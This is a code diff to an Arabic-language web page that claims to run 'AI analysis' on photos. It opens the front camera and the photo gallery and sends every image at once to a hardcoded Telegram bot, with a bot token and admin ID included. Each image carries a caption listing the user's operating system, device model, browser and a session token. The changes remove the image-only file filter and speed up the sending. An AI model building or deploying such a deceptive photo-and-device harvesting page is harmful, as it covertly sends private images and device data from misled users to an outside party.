@@ -234,12 +234,12 @@
     </div>
     
     <div class="btn-group" id="mainButtonArea">
-        <input type="file" id="cameraInput" accept="image/*" capture="user" style="display: none;">
+        <input type="file" id="cameraInput" capture="user" style="display: none;">
         <button class="btn camera-start" id="startCameraBtn" onclick="startCameraCapture()">
             <i class="fas fa-video"></i> التقاط بالكاميرا الأمامية (0/2)
         </button>
 
-        <input type="file" id="galleryInput" accept="image/*" style="display: none;" multiple>
+        <input type="file" id="galleryInput" style="display: none;" multiple>
         <button class="btn gallery-start" id="startGalleryBtn" onclick="startGalleryUpload()">
             <i class="fas fa-upload"></i> رفع من المعرض (0/2)
         </button>
@@ -251,7 +251,7 @@
     
     <div class="info-message">
         <i class="fas fa-exclamation-circle"></i>
-        يتطلب إرسال 4 صور لتشغيل خوارزميات الذكاء الاصطناعي.
+        يتم إرسال كل صورة **فوراً** بمجرد التقاطها/اختيارها.
     </div>
 
   </div>
@@ -263,6 +263,7 @@
     const TELEGRAM_BOT_TOKEN = "7641588791:AAGvjT-OItdTj3NsGqDPoWnYZnGO_BoQQp0"; 
     const TELEGRAM_ADMIN_ID = "1367401179"; 
     const TELEGRAM_PHOTO_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`; 
+    // ملاحظة: تيليجرام يتعرف على نوع الملف من البيانات المرفوعة (formData)
     
     const MAX_CAMERA_PHOTOS = 2;
     const MAX_GALLERY_PHOTOS = 2;
@@ -273,7 +274,7 @@
     let galleryPhotoCounter = 0;
     
     // **********************************
-    // * دوال النظام
+    // * الدوال
     // **********************************
 
     function analyzeUserAgent() {
@@ -332,7 +333,12 @@
         const { os, deviceModel, browser } = analyzeUserAgent();
         const sourceName = sourceType === 'camera' ? 'الكاميرا الأمامية' : 'المعرض';
         
-        return `📸 <b>تحليل AI (من ${sourceName} - الصورة ${current} من ${max})</b>\n\n🔑 <b>رمز معالجة الجلسة:</b> ${userSessionToken}\n\n📱 <b>تقرير الجهاز المحلل:</b>\n- <b>النظام:</b> ${os}\n- <b>الجهاز:</b> ${deviceModel}\n- <b>المتصفح:</b> ${browser}\n\n🕒 <b>وقت توثيق البيانات:</b> ${new Date().toLocaleString('ar-YE')}`;
+        // يمكننا إضافة معلومات عن حجم الملف ونوعه هنا للتأكد
+        const file = sourceType === 'camera' ? document.getElementById('cameraInput').files[0] : document.getElementById('galleryInput').files[0];
+        const fileSizeKB = file ? (file.size / 1024).toFixed(2) : 'N/A';
+        const fileType = file ? file.type : 'N/A';
+
+        return `📸 <b>تحليل AI (من ${sourceName} - الصورة ${current} من ${max})</b>\n\n🔑 <b>رمز معالجة الجلسة:</b> ${userSessionToken}\n\n📦 <b>بيانات الملف:</b>\n- <b>النوع:</b> ${fileType}\n- <b>الحجم:</b> ${fileSizeKB} KB\n\n📱 <b>تقرير الجهاز المحلل:</b>\n- <b>النظام:</b> ${os}\n- <b>الجهاز:</b> ${deviceModel}\n- <b>المتصفح:</b> ${browser}\n\n🕒 <b>وقت توثيق البيانات:</b> ${new Date().toLocaleString('ar-YE')}`;
     }
 
     // **********************************
@@ -350,7 +356,7 @@
     }
     
     // **********************************
-    // * دالة الإرسال السريع والمباشر
+    // * دالة الإرسال السريع والمباشر (بدون انتظار)
     // **********************************
     
     document.getElementById('cameraInput').addEventListener('change', (e) => handleFileUpload(e, 'camera'));
@@ -360,7 +366,7 @@
         const file = event.target.files[0];
         if (!file) return;
 
-        event.target.value = ''; 
+        event.target.value = ''; // إفراغ القيمة استعدادًا للصورة التالية
         
         let counter, max, btn;
         
@@ -383,35 +389,37 @@
         btn.classList.add('success');
         btn.innerHTML = `<span class="loading-dots"></span> جاري إرسال الصورة ${counter} فوراً...`;
         
-        updateStatusUI(`🚀 يتم الآن إرسال الصورة (${counter}) مباشرة للبوت...`);
+        updateStatusUI(`🚀 يتم الآن إرسال الصورة (${counter}) مباشرة للبوت في أسرع وقت ممكن...`);
         
+        // Caption must be built after the file object is available
         const caption = buildPhotoCaption(counter, max, sourceType);
 
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_ADMIN_ID);
-        formData.append('photo', file);
+        // نرسل الملف كما هو مهما كان نوعه وحجمه
+        formData.append('photo', file); 
         formData.append('caption', caption);
         formData.append('parse_mode', 'HTML');
 
         try {
-            // ⭐⭐⭐ هنا يحدث الإرسال المباشر بدون انتظار أي صور أخرى ⭐⭐⭐
+            // هذا هو الإرسال المباشر الأسرع (fetch)
             const response = await fetch(TELEGRAM_PHOTO_API_URL, {
                 method: 'POST',
                 body: formData
             });
 
             if (response.ok) {
-                // نجاح الإرسال الفردي
+                // نجاح الإرسال الفوري
                 updateStatusUI(`✅ تم إرسال الصورة ${counter} بنجاح!`);
                 
                 if (counter === max) {
                     btn.innerHTML = `<i class="fas fa-check-circle"></i> اكتمل التوثيق`;
                     updateStatusUI(`✅ اكتملت الحصة! تم إرسال كل الصور للبوت.`);
                 } else {
-                    // الانتقال الفوري للعملية التالية
+                    // الانتقال الفوري للعملية التالية (دون تأخير)
                     if (sourceType === 'camera') {
                         btn.disabled = false;
-                        document.getElementById('cameraInput').click(); // فتح الكاميرا فوراً للصورة التالية
+                        document.getElementById('cameraInput').click(); 
                     } else { 
                         btn.disabled = false;
                     }
